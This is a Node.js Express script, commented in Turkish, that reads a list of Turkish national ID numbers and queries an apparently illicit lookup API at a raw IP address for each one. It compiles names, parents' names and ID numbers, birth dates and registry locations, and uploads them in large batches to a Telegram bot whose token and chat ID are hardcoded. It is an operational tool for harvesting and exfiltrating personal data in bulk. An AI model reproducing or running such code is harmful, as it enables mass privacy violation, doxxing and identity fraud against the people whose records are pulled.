const express = require('express');
const axios = require('axios');
const fs = require('fs').promises;
const path = require('path');
const FormData = require('form-data');

const app = express();
const port = process.env.PORT || 3000;

const API_URL = 'http://45.81.113.22/apiler/aile.php';
const TC_FILE = path.join(__dirname, 'burger.txt'); // TC listeni buraya yükle

const TELEGRAM_BOT_TOKEN = '8232579729:AAEPjPqCN33b-cQzDLKdeSatK8oi_b44vDo';
const TELEGRAM_CHAT_ID = '8258235296';

let progress = 0;
let totalSuccess = 0;
let totalTried = 0;
let isRunning = false;

async function sendToTelegram(filePath, caption) {
  try {
    const form = new FormData();
    form.append('chat_id', TELEGRAM_CHAT_ID);
    form.append('document', await fs.readFile(filePath), path.basename(filePath));
    form.append('caption', caption);

    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendDocument`, form, {
      headers: form.getHeaders()
    });
    console.log(`Gönderildi: ${caption}`);
  } catch (err) {
    console.error('Telegram gönderme hatası:', err.message);
  }
}

async function processTcList() {
  if (isRunning) return;
  isRunning = true;
  progress = 0;
  totalSuccess = 0;
  totalTried = 0;

  let tcList;
  try {
    const content = await fs.readFile(TC_FILE, 'utf8');
    tcList = content.split('\n').map(t => t.trim()).filter(t => t.length === 11 && /^\d+$/.test(t));
  } catch (err) {
    console.error('TC dosyası okunamadı:', err);
    isRunning = false;
    return;
  }

  const total = tcList.length;
  console.log(`Toplam ${total} TC yüklendi, başlıyoruz...`);

  let currentChunk = '';
  let chunkPart = 1;

  for (let i = 0; i < total; i++) {
    const tc = tcList[i];
    totalTried++;
    progress = Math.round((totalTried / total) * 100);

    try {
      const res = await axios.get(`\( {API_URL}?tc= \){tc}`, { timeout: 6000 });
      const data = res.data;

      if (data.success && data.data) {
        totalSuccess++;
        const item = data.data;
        currentChunk += `TC: ${item.TC || tc}\n`;
        currentChunk += `ADI: ${item.ADI || ''} SOYADI: ${item.SOYADI || ''}\n`;
        currentChunk += `ANNEADI: ${item.ANNEADI || ''} ANNETC: ${item.ANNETC || ''}\n`;
        currentChunk += `BABAADI: ${item.BABAADI || ''} BABATC: ${item.BABATC || ''}\n`;
        currentChunk += `DOGUMTARIHI: ${item.DOGUMTARIHI || ''}\n`;
        currentChunk += `NUFUSIL: ${item.NUFUSIL || ''} NUFUSILCE: ${item.NUFUSILCE || ''}\n`;
        currentChunk += '-------------------\n\n';

        // 45 MB'a yaklaştığında gönder
        if (currentChunk.length > 45 * 1024 * 1024) {
          const tempFile = path.join(__dirname, `chunk_${chunkPart}.txt`);
          await fs.writeFile(tempFile, currentChunk.trim(), 'utf8');
          await sendToTelegram(tempFile, `Parça ${chunkPart} | Bulunan: ${totalSuccess} | Denenen: ${totalTried}`);
          await fs.unlink(tempFile);
          currentChunk = '';
          chunkPart++;
        }
      }
    } catch (err) {
      // Hata olursa sessizce geç (log bile atmıyoruz, sadece konsola)
    }

    await new Promise(r => setTimeout(r, 400));
  }

  // Kalan parçayı gönder
  if (currentChunk) {
    const tempFile = path.join(__dirname, `chunk_${chunkPart}.txt`);
    await fs.writeFile(tempFile, currentChunk.trim(), 'utf8');
    await sendToTelegram(tempFile, `Son Parça ${chunkPart} | Bulunan: ${totalSuccess} | Denenen: ${totalTried}`);
    await fs.unlink(tempFile);
  }

  console.log(`Bitti! Toplam ${totalSuccess} veri bulundu, Telegram'a gönderildi.`);
  isRunning = false;
}

app.get('/', (req, res) => {
  res.send(`
<!DOCTYPE html>
<html lang="tr">
<head>
  <meta charset="UTF-8">
  <title>TC Veri Gönderici</title>
  <style>
    body { font-family: Arial; text-align: center; background: #f0f4f8; padding: 30px; }
    h1 { color: #1a5276; }
    .progress { font-size: 80px; color: #27ae60; font-weight: bold; margin: 30px 0; }
    .count { font-size: 32px; color: #2980b9; }
    .status { font-size: 24px; margin: 20px 0; }
  </style>
</head>
<body>
  <h1>TC Listesinden Veri Gönderici</h1>
  <div class="progress">%${progress}</div>
  <div class="count">Gönderilen Veri: ${totalSuccess} / Denenen: ${totalTried}</div>

  ${progress < 100 ? '<div class="status">Arka planda çalışıyor... Loglara bakın.</div>' : '<div class="status">Bitti! Veriler Telegram\'a gitti.</div>'}
</body>
</html>`);
});

app.get('/start', async (req, res) => {
  if (totalSuccess === 0 && !isRunning) {
    processTcList();
    res.send('Başladı! Veriler geldikçe Telegram\'a parça parça gider.');
  } else {
    res.send('Zaten çalışıyor veya tamamlandı.');
  }
});

app.listen(port, () => console.log(`Port ${port}`));
